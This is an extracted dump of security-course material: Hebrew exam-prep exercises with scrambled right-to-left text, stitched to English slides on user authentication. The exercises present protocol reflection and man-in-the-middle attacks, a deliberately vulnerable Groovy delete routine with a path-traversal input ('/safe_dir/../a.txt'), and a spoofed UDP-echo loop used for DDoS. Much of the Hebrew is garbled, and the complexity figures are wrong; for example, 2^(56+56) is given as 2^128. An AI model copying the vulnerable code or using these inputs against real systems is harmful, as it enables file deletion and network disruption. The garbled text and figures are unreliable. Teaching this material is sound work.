DST(5 )PROTOCOL. ניתן באופן ישיר לבצע סינון של כתובת לכן לאMAC
.Packet Filtering Firewallבאמצעות 
Statefulל Stateless Firewallהעיקרי בין ההבדל • Firewall הוא שStateless 
Firewall איננו שומר מצב)מבצע סינון על בסיס ניתוח של חבילה אחת בלבד )
Statefulלעומת  Firewall אשר מממשTCP-Stack(ולכן יכול לבצע ( שומר מצב
ניתוח של שכבת האפליקציה
האפליקציהאיננו יכול לנתח את שכבת Stateless Firewallעקב כך ◦
Statefulאשר מהווה IP-Tables-הוא הUnixב Firewallדוגמא ל ◦ Firewall
5
3תרגיל 
בו שני ,נתון פרוטוקול בקרת הכניסה הבא •
הצדדים מאמתים אחד את השני 
oהלקוח שולח את זהותו : בשלב הראשוןid ואת אתגרc
לשרת
oהשרת מגיב על האתגר ע״י הצפנה של :בשלב השני
אשר מוסכם pwdהאתגר באמצעות המפתח הסימטרי 
sבנוסף השרת שולח את אתגר . בין השרת ללקוח
ללקוח
oהלקוח מוודא את תגובת השרת ומגיב :בשלב השלישי
על האתגר של השרת ע״י הצפנה של האתגר באמצעות 
אשר מוסכם בין השרת ללקוחpwdהמפתח הסימטרי 
oהשרת מוודא את נכונות האתגר של :בשלב הרביעי
הלקוח
6
3תרגיל 
השרת מאפשר , במידה והלקוח הגיב נכון•
כניסה למערכת
במידה והלקוח לא קיבל תגובה על הודעתו •
הוא , הראשונה תוך פרק זמן מוגדר מראש
אך במקביל ייזום ימשיך לחכות לה 
התחברויות נוספות על מנת להגדיל את 
הסיכוי להצלחה
במידה ולא הציגו ? הפרוטוקול בטוחהאם •
תקיפה על הפרוטוקול
7
-בעיית ה)התחזות ללקוח–פתרון 
Sessionהכפול)
8
Masquerade Client Real Server
realClient, c1
s1, 𝑐1 𝑝𝑤𝑑
realClient, c2 = s1 ∗ c1
s2, 𝑠1 ∗ 𝑐1 𝑝𝑤𝑑
s2, 𝑠1 ∗ 𝑐1 𝑝𝑤𝑑
התקפת )התחזות לשרת –פתרון 
MiTM)
9
Real Client Masquerade Server
realClient, c1
s1, 𝑐1 𝑝𝑤𝑑
𝑠1 ∗ 𝑐1 𝑝𝑤𝑑
Real Server
realClient, c1
s1, 𝑐1 𝑝𝑤𝑑
4תרגיל 
:הבא𝐷𝑎𝑣𝑖𝑑𝐷𝑒𝑠דוד הציע את אלגוריתם ההצפנה •
בתים כל אחד56בני 𝑘2-ו𝑘1כאשר  •
.I הודעה ידועה תאר התקפת(Known plaintext attack) על האלגוריתם אותו הציע
דוד
.II האם הצפנה באמצעות הפעלת אלגוריתםDES המהווה שרשור של יחיד על מפתח
𝑘)שני המפתחות  = 𝑘1 ∗ 𝑘2 )י דוד"הינה עדיפה על פני ההצפנה המוצעת ע
.III האם הצפנה באמצעות הפעלת אלגוריתםDES המהווהיחיד על מפתח𝑋𝑂𝑅 של
𝑘)שני המפתחות  = 𝑘1⨁ 𝑘2 )י דוד"הינה עדיפה על פני ההצפנה המוצעת ע
10
𝐷𝑎𝑣𝑖𝑑𝐷𝑒𝑠𝑘1,𝑘2 𝑀 = 𝐷𝐸𝑆𝑘2(𝐷𝐸𝑆𝑘1 𝑀 )
פתרון
.I ניתן לממש התקפתMeet In The Middle באמצעות . על האלגוריתם של דוד
:סיבוכיות זמן הריצה היאHash-Tableשימוש במבנה נתונים מסוג 
𝑂 256 + 𝑂 256 = 𝑂(256)
.II אכן הצפנה באמצעות הפעלת אלגוריתםDES המהווה שרשור יחיד על מפתח
𝑘)של שני המפתחות  = 𝑘1 ∗ 𝑘2 )י "הינה עדיפה על פני ההצפנה המוצעת ע
:דוד סיבוכיות זמן הריצה של התקפה זו היא
𝑂 256+56 = 𝑂 2128
.III הצפנה באמצעות הפעלת אלגוריתםDES המהווהיחיד על מפתח𝑋𝑂𝑅 של
𝑘)שני המפתחות  = 𝑘1⨁ 𝑘2)י דוד"עדיפה על פני ההצפנה המוצעת עאינה ,
𝑂: סיבוכיות זמן הריצה של שני האלגוריתמים היא 256
11
𝐷𝑎𝑣𝑖𝑑𝐷𝑒𝑠𝑘1,𝑘2 𝑀 = 𝐷𝐸𝑆𝑘2(𝐷𝐸𝑆𝑘1 𝑀 )
5תרגיל 
:תאר את הבעיה בקוד הבא•
12
def path = System.console().readLine 'Enter 
file path:'
if (path.startsWith("/safe_dir/"))
{
File f = new File(path);
f.delete()
}
פתרון
safe_dirלתקייתתוקף יכול למחוק קבצים מחוץ Path Traversingחשוף למתקפת הקוד •
אשר נמצא מחוץ  a.txtהקוד ימחוק את הקובץ safe_dir/../a.txt: הנתיב הבאעבור : דוגמא•
safe_dirלתקיית 
13
def path = System.console().readLine 'Enter file 
path:'
if (path.startsWith("/safe_dir/"))
{
File f = new File(path);
f.delete()
}
6תרגיל 
תאר . Unixבמערכת קבצים מסוג ls –lלפניך תוצאת ההרצה של הפקודה •
ל Directory-1כיצד באים לידי ביטוי ההבדלים בהרשאות בין תיקיית 
Directory-2:
14
$ls -l
drwxrwxrwx 2 RonBitton staff  68 Jul 30 22:32 Directory-1
drwxrwxrwt 2 RonBitton staff  68 Jul 30 22:32 Directory-2
פתרון
משתמשים אשר , איננו דלוק ועל כן Sticky-bit-דגל הDirectory-1בתקיה •
גם במידה ואין להם )יכולים למחוק קבצים מתוך התקייה  staffחברים בקבוצה 
(הרשאת כתיבה לקבצים אלו
כן מחיקת קבצים בתוך ועל דלוק  Sticky-bit-דגל הDirectory-2בתקיה •
.והבעלים של קבצים אלוRonBitton ,root-התקיה תתאפשר אך ורק ל
15
$ls -l
Drwxrwxr-x  2 RonBitton staff  68 Jul 30 22:32 Directory-1
Drwxrwxr-t 2 RonBitton staff  68 Jul 30 22:32 Directory-2
7תרגיל 
:להלן מפרט של נתב ארגוני
משתי האפשרויות ממשק הניהול של הנתב זמין באחת •
: הבאות
o ממשקcommand-lineדרך פרוטוקולTelnet  לכתובת הIP 
.הנתבשל 
o לשרת ממשק גראפי דרך הדפדפןWeb מעל פרוטוקול
HTTPS .
המנהל להקיש הממשק הגראפי על דרך בהתחברות לנתב •
.שם משתמש וסיסמא
o מתקבלת , "המשתמששם "המשתמש טועה בהקלדת כאשר
"המשתמשטעות בהקלדת שם "ההודעה 
oמתקבלת " סיסמא"כאשר המשתמש טועה בהקלדת ה
". טעות בהקלדת הסיסמא"ההודעה 
oניסיונות של כניסה שגויה 3הממשק מאפשר רק , בנוסף
ניסיונות –דקות 30-הממשק ננעל ל, מכןלאחר . למערכת
המערכת יכול ההתחברות אלו מתועדות באופן שבו מנהל 
Webלצפות בהם דרך ממשק ה 
o הלהלןLog 
כיצד תוקף יוכל לנצל בעיות האבטחה בנתב וציין כל מנה את 
.לבעיות אבטחה אלודרכי מניעה הצע , כמו כן. אותן
16
פתרון
:להלן מפרט של נתב ארגוני
: משתי האפשרויות הבאותממשק הניהול של הנתב זמין באחת •
o ממשקcommand-lineדרך פרוטוקולTelnetלכתובת הIP  הנתבשל
SSHיש להשתמש ב , פרוטוקול זה לא מאובטח
o לשרת ממשק גראפי דרך הדפדפןWeb מעל פרוטוקולHTTPS .
המנהל להקיש שם הממשק הגראפי על דרך בהתחברות לנתב •
.משתמש וסיסמא
o ההודעה מתקבלת , "המשתמששם "המשתמש טועה בהקלדת כאשר
"המשתמשטעות בהקלדת שם "
oטעות "מתקבלת ההודעה " סיסמא"כאשר המשתמש טועה בהקלדת ה
". בהקלדת הסיסמא
על המערכת להחזיר כי , אין צורך בפירוט יתר לגבי הודעת השגיאה
. החיבור לא צלח ולא לפרט את מהות השגיאה
oלמערכתניסיונות של כניסה שגויה 3הממשק מאפשר רק , בנוסף .
ניסיונות ההתחברות אלו –דקות 30-הממשק ננעל ל, מכןלאחר 
המערכת יכול לצפות בהם דרך ממשק ה מתועדות באופן שבו מנהל 
Web
o הלהלןLog 
בהסתכלות על קובץ התיעוד ניתן לראות כי המערכת מאפשרת הכנסת 
יש לברור , (SQL Injection)פוטנציאל להזרקה של קוד –תווים מיוחדים 
.תווים שכאלו
17
8תרגיל 
, של האוניברסיטהIT-סטודנט בקורס אבטחה התחיל לעבוד במחלקת ה•
במהלך יום העבודה הראשון מצא עצמו הסטודנט גומע מספר רב של 
.קילומטרים בבדיקה האם מחשבים מסוימים באוניברסיטה דלוקים או כבויים
הסטודנט הציע לכתוב אפליקציה פשוטה מבוססת שרת לקוח אותה יתקין בכל •
:האפליקציה פועלת באופן הבא. מחשב באוניברסיטה
.השרתשל port988-ל UDPשולח חבילת הלקוח •
כפי )השולח port-ולכתובת , מחזיר את אותו תוכן בדיוקבמידה והשרת דלוק הוא •
(.שצוינו בחבילה
יכול לשלוח בקשות מפורטים שונים לכלל מחשבי ( הסטודנט)באופן שכזה הלקוח •
. האוניברסיטה ולמפות בעזרתם מי מהמחשבים דלוק
הדגם ניצול לרעה של הפרוטוקול
18
פתרון
988תוקף יכול להעמיס על הרשת באמצעות שליחת בקשת פרוטוקול מפורט •
.של מחשב אחר ברשתIP-תוך זיוף כתובת ה
תיווצר לולאה אינסופית בין שני השרתים אשר תעמיס על , באופן שכזה•
.הרשת
מימוש התקפה זו מספר רב של פעמים עבור מחשבים שונים יגרום להתקפת •
DDOS רשת האוניברסיטהעל .
19
דוגמאות לשאלות סגורות מהמבחן
אילו מהעקרונות , ביצעת פעולה עוינת בארגון תחת שם המשתמש שלך1.
הבאים אשר נלמדו בקורס לא יאפשר לך להתכחש לביצוע הפעולה
.IAuthorization
.IILeast Privileges
.IIINon Repudiation
.IVSeparation of duties
לאילו מהמתקפות הבאות סיכוי גבוה יותר להצליח2.
.iPhishing
.iiSpear-Phishing
20
דוגמאות לשאלות סגורות מהמבחן
אילו מהעקרונות , ביצעת פעולה עוינת בארגון תחת שם המשתמש שלך1.
הבאים אשר נלמדו בקורס לא יאפשר לך להתכחש לביצוע הפעולה
.IAuthorization
.IILeast Privileges
.IIINon Repudiation
.IVSeparation of duties
לאילו מהמתקפות הבאות סיכוי גבוה יותר להצליח2.
.iPhishing
.iiSpear-Phishing
21
דוגמאות לשאלות סגורות מהמבחן
הנכונה ביותר סמן את התשובה , Firewalls-השאלה הבאה מתייחסת ל
.iFirewall  לעצור התקפות מסוג מסוגלSocial Engineering
.ii כאשר הגם-Firewalls מהארגוןתתכן הדלפת מידע , מקונפג נכוןהארגוני
.iiiב-firewall , החוק הראשון הוא הספציפי ביותר והחוק האחרון הוא הכללי
ביותר
.ivStateful Firewall יותר מהגנה טובה מספק-Stateless Firewall
.vPacket Filtering Firewall (Stateless) מסוגל למנוע תקשורת דואר אלקטרוני
"Start the attack"הכולל בתוכו את התוכן 
.vi נכונהטענה אינה אף
.viiד נכונות,ג,תשובות ב
.viiiו נכונות,ה,תשובות ד
22
דוגמאות לשאלות סגורות מהמבחן
הנכונה ביותר סמן את התשובה , Firewalls-השאלה הבאה מתייחסת ל
.iFirewall  לעצור התקפות מסוג מסוגלSocial Engineering
.ii כאשר הגם-Firewalls מהארגוןתתכן הדלפת מידע , מקונפג נכוןהארגוני
.iiiב-firewall , החוק הראשון הוא הספציפי ביותר והחוק האחרון הוא הכללי
ביותר
.ivStateful Firewall יותר מהגנה טובה מספק-Stateless Firewall
.vPacket Filtering Firewall (Stateless) מסוגל למנוע תקשורת דואר אלקטרוני
"Start the attack"הכולל בתוכו את התוכן 
.vi נכונהטענה אינה אף
.viiד נכונות,ג,תשובות ב
.viiiו נכונות,ה,תשובות ד
23
דוגמאות לשאלות סגורות מהמבחן
או (Discretionary Access Control (DACהשלם את כל אחד מהמשפטים ב 
Mandatory Access Control (MAC)
.i אליויוצר הקובץ מגדיר את הרשאות הגישה ____ ב.
.ii לקבציםמערכת ההפעלה מגדירה את הרשאות הגישה ____ ב.
.iii ההרשאות הקבצים ב מערכתLinux  היא מסוג____.
.iv מוגדרת רמת סיווג לכל משתמש ואובייקט____  ב .
24
דוגמאות לשאלות סגורות מהמבחן
או (Discretionary Access Control (DACהשלם את כל אחד מהמשפטים ב 
Mandatory Access Control (MAC)
.i בDAC אליוהקובץ מגדיר את הרשאות הגישה יוצר.
.ii בMAC לקבציםההפעלה מגדירה את הרשאות הגישה מערכת.
.iii ההרשאות הקבצים ב מערכתLinux היא מסוג.DAC
.iv בDAC רמת סיווג לכל משתמש ואובייקטמוגדרת .
25
דוגמאות לשאלות סגורות מהמבחן
:כל אחד מהמושגים הבאיםהסבר
.IReverse TCP Shell
.IICuckoo
26
דוגמאות לשאלות סגורות מהמבחן
:כל אחד מהמושגים הבאיםהסבר
.IReverse TCP Shell– פתיחת חיבורTCP באופן הפוך ממחשב הנתקף אל
או Firewallזה כאשר נרצה לעקוף  Shell-נעשה שימוש ב, מחשב התוקף
NAT
.IICuckoo–סאנדבוקס המשמש לניתוח סטאטי ודינאמי של קבצים
27
בהצלחה בבחינה
יניםסטודנטים  ר מצטי ל ישי נם להמשיך במסלו אשר ברצו
נים להתמקצע באבטחת מידע ( מסלול מיתר)לתואר שני  י י נ ומעו
יל צור איתי קשר במי זמנים לי :מו
RONBIT@POST.BGU.AC. IL
28
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\authentication\CompNetSec4_User-Authentication.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (372-1-460-1)
User authentication
Dept. of Software and Information 
Systems Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2018
Authentication and access control 
requirements
– Same username/password? 
– iPhone’s fingerprint verification?
• Privacy
• Confidentiality
• Reliability
2
Authentication, Authorization, 
Accountability (AAA)
• Authentication
– Identification – who are you? ; specify identifier (username, account number, fb) 
– Verification – can you prove it? (password, PIN code, smartcard, token) 
• Face verification? Fingerprint verification?
• Authorization – ok, this is what you are allowed to do and access! (permissions)
• Auditing and accountability
– tracking and recording the activity of a user so that users can be held accountable for their 
actions
• Different from message authentication in
• message authentication might not happen in real time; 
• User\entity authentication does
• message authentication needs to be repeated for each new message; 
• User\entity authentication authenticates for the whole duration of the session 
(today, even more, for mobile apps, or in the browser)
3
RFC 2828 (Internet Security Glossary)
• RFC 2828 defines user authentication as: 
“The process of verifying an identity claimed by or for 
a system entity.”
– “Entity authentication is a technique designed to let one 
party prove the identity of another party. 
– An entity can be a person, a process, a client, or a server. 
– The entity whose identity needs to be proved is called the 
claimant; 
– The party that tries to prove the identity of the claimant is 
called the verifier.”
4
User Authentication Process
• fundamental building block and primary line of defense
• basis for access control and user accountability
• identification step
– presenting an identifier to the security system
• (username, smartcard, token)
• verification step
– presenting or generating authentication information to the 
system that corroborates the binding between the entity 
and the identifier
5
Authentication Process
• Authentication mechanism
– visible to the user
– e.g., password, fingerprint, smartcard
• Authentication protocol
– Transparent, e.g.:
– Kerberos – Strong authentication for Client server based on 
symmetric encryption
– Extensible Authentication Protocol (EAP) -
authentication framework frequently used in wireless 
networks and point-to-point connections
6
User Authentication
• One way authentication
– One time continues authentication (fb, 
browser, smartphone)
• Mutual authentication
7
?
?
User Authentication
• Something you know
– password, PIN, answers to prearranged questions
• Something you have
– smartcard, electronic keycard, physical key
• Something you are (static)
– Fingerprint, retina, face
• Something you do (dynamic)
– voice pattern, handwriting, typing rhythm (ABV-Moskovitch)
8
Password Authentication
• Widely used line of defense against intruders
– user provides name/login and password
– the system compares the password with the one stored for that 
specified login
– Usually only the Hash Code (SHA) of the passwords are stored
• the user ID:
– determines that the user is authorized to access the system 
(such username exists)
– determines the user’s permissions
– is used in discretionary access control (for instance editing 
permission in dropbox folder through email address)
9
Password Authentication
• How is the password communicated?
– eavesdropping risk
• How is the password stored?
– in the clear? encrypted? hashed?
• How does the system check the password?
• How easy is it to guess the password?
– easy-to-remember passwords tend to be easy to 
guess
– password file is difficult to keep secret
slide 10
Password-based protocols
• Simple username/password (e.g., telnet)
• S/Key
• Challenge-Response
• Kerberos
• …
slide 11
Password Vulnerabilities
• Install sniffer or keylogger
• Run cracking tools on password files
• Specific account attack (guessing against single user)
• Popular password attack (against wide range of IDs)
• Workstation hijacking (unattended logged-in station)
• Session hijacking (using stolen cookie)
• Exploiting user mistakes (multiple password use, writing, share, 
admin)
• Electronic monitoring (eavesdropping to passwords transmitted across 
net)
• Replay attack (replay-repeat passwords transmission)
• Man-in-the-middle attack (double agent with new PSW)
• 8 out of 9 exploits involve password stealing and/or cracking 
(Mitnick’s “Art of Deception”)
– usernames and passwords stored in the clear
– use default password12
Countermeasures
• Controls to prevent unauthorized access to password file
• Intrusion detection measures
• Rapid reissuance of compromised passwords
• Account lockout mechanisms
• Policies to inhibit users from selecting common passwords
• Training in and enforcement of password policies
• Automatic workstation logout
• Policies against similar passwords on network devices13
Dictionary and Brute Force 
Attacks and need in Salt
Use of Hashed Passwords
• Add Salt (random num) :
– duplicate passwords 
cannot be identified
(Different salts)
– increases cracking
effort (factor of 2b)
* With salt hashing all 
the passwords against
all the salts
– nearly impossible to 
identify the same 
passwords of the 
same user across
multiple systems
(Different salts)
15
Use of Hashed Passwords
UNIX Implementation
• original scheme
– password up to 8 printable characters in length 
(converted into 56-bit value using 7bit ASCII code),  
– This 56 bit of the password serves as the key encryption
– 12-bit salt used
– Using crypt(3) that is one way hash function based on DES algorithm
– 64 bit block of zero value +  12 bit salt are first encrypted
– Then the encryption is repeatedly done 25 times
– output translated to 11 character sequence
• now regarded as inadequate
– Strong CPU was able to process over 50M password guesses in 80 min
17
Improved Implementations
much stronger hash/salt 
schemes available for 
Unix
recommended hash 
function is based on 
MD5
• salt of up to 48-bits
•password length is 
unlimited
•produces 128-bit hash
•uses an inner loop with 
1000 iterations to 
achieve slowdown
OpenBSD uses 
Blowfish block cipher 
based hash algorithm 
called Bcrypt
•most secure version of Unix 
hash/salt scheme PSW up 
to 55 characters
•uses 128-bit salt to create     
192-bit hash value
18
Password Cracking
• Dictionary attacks
– use a large dictionary of possible passwords 
and try each against the password file
– each password must be hashed using each salt 
value and then compared to stored hash values
• rainbow table attacks
– pre-compute tables of hash values for all salts
– can be countered by using a sufficiently large 
salt value and a sufficiently large hash length
19
Observed Password Lengths
*Source: study at Purdue university
20
Passwords 
Cracked from 
a Sample Set 
of 13,797 
Accounts
*Computed as the number of matches 
divided by the search size.  The more 
words that need to be tested for a 
match, the lower the cost/benefit ratio.
21
Password File Access Control
• Make available only to privileged users can block 
offline guessing attacks by denying access to 
encrypted passwords
• Shadow password file - a separate file from the 
user IDs where the hashed passwords are kept
• Vulnerabilities
– weakness in the OS that allows access to the file
– accident with permissions making it readable
– users with same password on other systems
– access from backup media
– sniff passwords in network traffic
22
Password Selection Techniques
• User education
• Computer generated - users have trouble 
remembering them
• Reactive password checking - system 
periodically runs its own password cracker 
to find guessable passwords
• Proactive password checking - the system 
checks to see if the password is allowable, 
and if  not, rejects it
23
Proactive Password Checking
• rule enforcement
– specific rules that passwords must adhere to
• password cracker
– compile a large dictionary of passwords not to 
use
• Bloom filter
– used to build a table based on dictionary using 
hashes
– check desired password against this table
24
Bloom Filter
25
Phishing…
slide 26
Images from Anti-Phishing Working Group’s Phishing Archive
slide 27
Images from Anti-Phishing Working Group’s Phishing Archive
The next page requests:
• Name
• Address
• Telephone
• Credit Card Number, Expiration Date, 
Security Code
• PIN
• Account Number
• Personal ID
• Password
slide 28
slide 29
Images from Anti-Phishing Working Group’s Phishing Archive
slide 30
WHOIS 210.104.211.21: 
Location: Korea, Republic Of
Images from Anti-Phishing Working Group’s Phishing Archive
Advanced Phishing Attacks
• Spear-phishing: Improved target selection
• Socially aware attacks
– Mine social relationships from public data
– Phishing email appears to arrive from someone 
known to the victim 
• Context-aware attacks
slide 31
Memory Cards
• can store but do not process data
• the most common is the magnetic stripe card
• can include an internal electronic memory
• can be used alone for physical access (hotel room, ATM)
• provides significantly greater security when combined with a 
password or PIN (credit/debit)
• drawbacks of memory cards include:
– requires a special reader (paypal)
– loss of token prevents access and requires replacement
– user dissatisfaction for using these cards for computer access
32
Smartcards
• Has an embedded micro-processor and I\O port
• Card readers provide the power supply
• Provides authentication services
• Two types: contact and contact-less (using Radio Frequency 
Identification (RFID))
• Can look like calculators, keys, small portable objects
• interface:
– manual interfaces include a keypad and display for interaction
– electronic interfaces communicate with a compatible 
reader/writer
• Attacks on smart cards
– Fault generation - changing input voltage, clock rate, 
temperature fluctuations
– Microprobing - directly tapping into the card’s ROM chips
– Side channel attacks - nonintrusive attacks, measure power or 
frequency emissions33
The smart card chip is embedded into the
plastic card and is not visible. The dimensions 
conform to ISO standard 7816-2.
Smartcard Dimensions
• Read Only Memory (ROM) – card number, holder name…
• Electronically erasable programmable ROM (EEPROM) –
protocols, application data, talk time… 
• Random Access Memory (RAM)
- execution data
34
Smartcards Regulations
• Homeland Security Presidential Directive 12 (HSPD-12): 
Policy for a Common Identification Standard for Federal 
Employees and Contractors
“U.S. policy is to enhance security, increase Government 
efficiency, reduce identity fraud, and protect personal 
privacy by establishing a mandatory, Government-wide 
standard for secure and reliable forms of identification 
issued by the Federal Government to its employees and 
contractors (including contractor employees).”
• Federal Information Processing Standard Publication 
(FIPS PUB) 201-1: Personal Identity Verification (PIV) 
of Federal Employees and Contractors
National Institute of Standards and Technology (NIST)
35
Smartcards
• authentication protocol - categories:
– static 
• user is authenticated to the token
• Then the token authenticates the user with the system.
– dynamic password generator – periodically 
generates a unique password (RSA tokens)
– challenge-response
• The computer generates a challenge (random string of 
numbers)
• The token responses with encryption of the random 
numbers with his private key
36
Tokens - asynchronous 
authentication
• Uses the challenge-response method
• Masquerading attack is possible if the token is shared or 
stolen
• Not vulnerable to eavesdropping, sniffing, replay, or 
password guessing
37
1. request 
access (Bob)
2. Challenge
value (nonce)
4. Enters 
Challenge and PIN
5. Encrypts the 
Challenge and 
presents the one-
time password
3. Present 
Challenge value
6. Enters the one-
time password 7. one-time 
password 8. verify the 
one-time 
password 
Bob
Tokens - synchronous 
authentication
• The token device and the authentication 
servers are synchronized using time or counter
• Time-based
– the token device and authentication server should 
have the same time
– current time,  token ID and a secret (e.g., PIN) are 
used to generate the one-time password
– RSA SecureID time-based tokens
–
• Event-based
– usually, a counter is advanced to the next 
authentication value by pushing a button of the 
token device
38
S/Key Protocol
• Lamport's scheme
• One-time password scheme
• The two sides agree on password (pwd), and choose initial counter 
ctr
• System stores in the passwords file h(h(…(h(pwd)…)=hctr(pwd), ctr
• During the authentication process the system send the ctr and 
requests for hctr-1(pwd)
• If authenticates, the system updates the password file with hctr-
1(pwd), ctr-1
• When the counter is set to zero the user selects a new password
Biometric Authentication
• attempts to authenticate an individual 
based on unique physical characteristics
• based on pattern recognition
• Is technically complex and expensive
when compared to passwords and tokens
• - iPhone finger? security/usability?
41
Biometric Authentication
• Face recognition
– Measures various features in the face such as 
distances between eyes, nose etc.
– Accurate but no well accepted due to privacy issues
• Fingerprint
– Patterns on the tip of a finger
– Sensitive to minor changes (temperature, pressure, 
surface damage)
– Accurate, acceptable by the user
– Some people have no fingerprint,.. Live detection
• Hand geometry and hand topography 
– Shape, size peaks and valleys
– Accurate, acceptable by the user42
Biometric Authentication
• Retina (רשתית)
– Blood vessel patterns
– Very accurate however, sensitive to physical 
condition (diabetes, pregnancy, heart attack); 
perceived as intrusive
• Iris scan (קשתית)
– Patterns in the iris
– Very accurate however, sensitive to physical 
condition (diabetes, pregnancy, heart attack); 
perceived as intrusive
43
Biometric Authentication
• Voice patterns (behavioral)
– Not so accurate
– The person can be recorded; solution – use a 
challenge
• Keystroke dynamics (behavioral)
– Dwell time; flight time
– 2-factor authentication
– Can provide continuous verification
– Cons: Different keyboards, injuries,..
• Signature dynamics
44
Biometrics - parameters to 
consider
• Accuracy
• Intrusiveness
• Cost
• Time to process
45
Operation of a Biometric System
46
Biometric Accuracy
47
Biometrics
• Convert physical attributes to digital data
• Types of biometric authentication methods
– Physiological
– Behavioral
• False Acceptance Rate (FAR)
• False Rejection Rate (FRR)
• Crossover Error Rate (CER)
– Used for comparing products and
setting standards
48
Biometric Measurement Operating 
Characteristic Curves
49
Actual Biometric Measurement 
Operating Characteristic Curves
50
BioMetrics Vulnerabilities
• In WOOT Workshop of Usenix conference 2014 held in San-
Diego it was shown that using Smartphones:
• Fingerprints are not secured at all….
52
Authentication protocol
• Sequence of communications by two or 
more parties to achieve security 
objective(s)
53
A  B: A “Hi, I’m Alice”
B  A: Enter password: “Prove It!”
A  B: $R%&^8! “Here’s the proof”
Authentication protocol
• Sequence of communications by two or 
more parties to achieve security 
objective(s)
• Not like this… (password can be intercepted)
54
A  B: A “Hi, I’m Alice”
B  A: Enter password: “Prove It!”
A  B: $R%&^8! “Here’s the proof”
Attacker model
• Eve can:
– Sees all messages
– Delete, alter, inject and redirect messages
– Initiate new communications
– Reuse messages from past sessions
• Eve cannot:
– Solve “hard” problems
– Guess pseudo-random values (e.g., nonces)
– Get another identity (identity theft)
55
Authentication protocol (1)
• What’s the problem with this?
– The nonce Nb leaks, so it cannot be used to 
secure the session
56
A  B: A “Hi, I’m Alice”
B  A: Enc(Nb,PKa) “Prove It!”
A  B: Nb “Here’s the proof”
Authentication protocol (2)
A  B: A “Hi, I’m Alice”
B  A: Enc(Nb,PKa) “Prove It!”
A  B: Enc(Nb,PKb) “Here’s the proof”
57
Authentication protocol (2)
A  B: A “Hi, I’m Alice”
B  A: Enc(Nb,PKa) “Prove It!”
A  B: Enc(Nb,PKb) “Here’s the proof”
58
• Man-in-the-middle attack:
A  E  B : A B receives “A” 
from E
B  E  A : Enc(Nb,PKa) E uses A to 
decrypt Nb
A  E : Enc(Nb,PKe) Now E has Nb
E  B : Enc(Nb,PKb) E fools B
Authentication protocol (3)
A  B: A “Hi, I’m Alice”
B  A: Enc({B,Nb},PKa) “Prove It!”
A  B: Enc(Nb,PKb) “Here’s the proof”
59
• Does it work now?
A  E B : A “Hi, I’m Alice”
B  E  A : Enc({B,Nb},PKa) A can see that the 
message is not 
from E
Mutual Authentication
38
Attack on Mutual Authentication
Session Hijacking
• Man-in-the-middle attack
• Attacker waits for the authentication 
process to end successfully
• Disconnects the user by sending a 
disconnecting message and continues the 
session
• Solution: use session (symmetric) key
Remote User Authentication
• Authentication over a network, the 
Internet, or a communications link is 
more complex
– additional security threats such as: 
eavesdropping, capturing a password, 
replaying an authentication sequence that 
has been observed
• Generally rely on some form of a 
challenge-response protocol to counter 
threats
63
Password Protocol
• user transmits identity to 
remote host
• host generates a random 
number r (nonce)
• nonce is returned to the user
• host stores a hash code of the 
password
• function in which the password 
hash is one of the arguments
• use of a random number helps 
defend against replay attack in 
which an adversary capturing 
the user’s transmission and 
retransmit it again.64
Token Protocol
• user transmits identity to 
the remote host
• host returns a random 
number and identifiers
• token either stores a static 
passcode or generates a 
one-time random passcode
• user activates passcode by 
entering a password
• password is shared between 
the user and token and does 
not involve the remote host
65
Static Biometric Protocol
• user transmits an ID to the 
host
• host responds with a random 
number and the identifier for 
an encryption
• client system controls 
biometric device on user side
• host decrypts incoming 
message and compares these to 
locally stored values
• host provides authentication by 
comparing the incoming device 
ID to a list of registered 
devices at the host database
66
Dynamic Biometric Protocol
• host provides a random 
sequence and a random 
number as a challenge
• sequence challenge is a 
sequence of numbers, 
characters, or words
• user at client end must then 
vocalize, type, or write the 
sequence to generate a 
biometric signal
• the client side encrypts the 
biometric signal and the 
random number
• host decrypts message and 
generates a comparison67
Authentication Security Issues
• Adversary attempts to achieve user authentication without access to 
the remote host or the intervening communications path (e.g., 
eavesdropping)
• Host attack: Directed at the user file at the host where passwords, 
token passcodes, or biometric templates are stored
• Replay - adversary repeats a previously captured user response
• Client attacks – masquerade a legitimate user and guess passwords.
• Denial-of-service - attempts to disable a user authentication service 
by flooding the service with numerous authentication attempts
• Trojan horse - an application or physical device masquerades as an 
authentic application or device for the purpose of capturing a user 
password, passcode, or biometric
68
Potential 
Attacks, 
Susceptible 
Authenticators
, and Typical 
Defenses
69
Identity Management (IDM)
• Identity management products are used to id, authenticate 
and authorize users in an automated means
• Enforce organization policies
• Authorization creep prevention - the accumulation of access 
rights over time, particularly those that the user does not 
have a need to know
• These products may include
– User account management
– Access controls
– Password management
– Single-Sign-On (SSO)
– Permissions
GSM Authentication
• Subscriber Identity Module (SIM)
• Tamper-resistant
– protected by a PIN code (checked locally by the SIM)
– removable from the terminal
– contains all data specific to the end user which have to 
reside in the Mobile Station (MS):
• IMSI: International Mobile Subscriber Identity (permanent user’s 
identity)
• PIN
• TMSI (Temporary Mobile Subscriber Identity)
• Ki : User’s secret key
• CK : Ciphering key
• List of the last call attempts
• List of preferred operators
• Supplementary service data (abbreviated dialing, last short 
messages received,...)
71
GSM Authentication
• Protected by a Personal Identification 
Number (PIN)
– Can be changed by the Subscriber
– Four digit code
– Usually 3 attempts before phone is blocked
• Bypassing the PIN requires the Pin 
Unblocking Key (PUK)
– 8 digit code
– Set by manufacturer
– Maximum 10 attempts before phone is 
permanently blocked
72
GSM Authentication
• Processor is used for providing access 
to the data and security
• Standard smart card reader and SIM 
access
• Software is required
73
GSM Authentication
• Mobile Station (cell-phone) authenticates to 
mobile operator - public land mobile network 
(PLMN)
• Mobile Station (MS) stores a symmetric 
authentication key ki in the SIM. Same key is 
stored by Home PLMN
• Problem: authentication to Visited PLMN that 
doesn’t have key, without exposing key over air
• Solution:
– first - billing agreement between HPLMN and 
visited PLMN
– second – challenge response protocol
GSM Authentication Components
77
Base Station Controller (BSC) - The network element 
which provides all the control functions and physical links 
between the MSC and BTS. Provides functions such as 
handover, cell configuration data, and control of radio 
frequency (RF) power levels in Base Transceiver Stations.
Base Transceiver Station (BTS) - The network 
element which handles the radio interface to the 
